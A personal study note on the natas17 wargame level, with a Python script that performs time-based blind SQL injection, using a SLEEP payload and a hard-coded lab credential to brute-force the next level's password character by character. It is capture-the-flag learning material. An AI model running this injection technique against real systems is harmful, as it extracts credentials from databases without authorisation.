
2024-07-20 14:18

Source:  #natas 

similar to the [[BlindSQL]] problem in  [[SQL injection w py]] this problem also has one input field named username and a DB schema that defines username and password fields
the difference is that the echo statements are commented out, so we don't get to know if the username with a specified character exists or not .

```python
import requests
import re
import string
from time import *

characters = string.ascii_letters+"0123456789"
username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = 'http://natas17.natas.labs.overthewire.org/?debug=true'
session = requests.Session()
seen_password = list()

while ( len(seen_password) < 32 ):
    for character in characters:
    
        start_time = time()
        # print ("start_time", start_time)
        print ("trying", "".join(seen_password) + character)
        
        response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )

        content = response.text
        end_time = time()
        # print ("end_time", end_time)
        difference = end_time - start_time

        if ( difference > 1 ):
            # success, correct character!
            seen_password.append(character)
            break
        # print content
```
## TLDR 

- start timer before posting request and end timer after receiving the request 
- in the response we create a delay of 1 second if we find the character in the password 
- we then measure the difference between start time and end time 
- for characters with delay of more than 1 second we add them to the seen list

### References
https://www.youtube.com/watch?v=GDOpW-LShy8&t=1s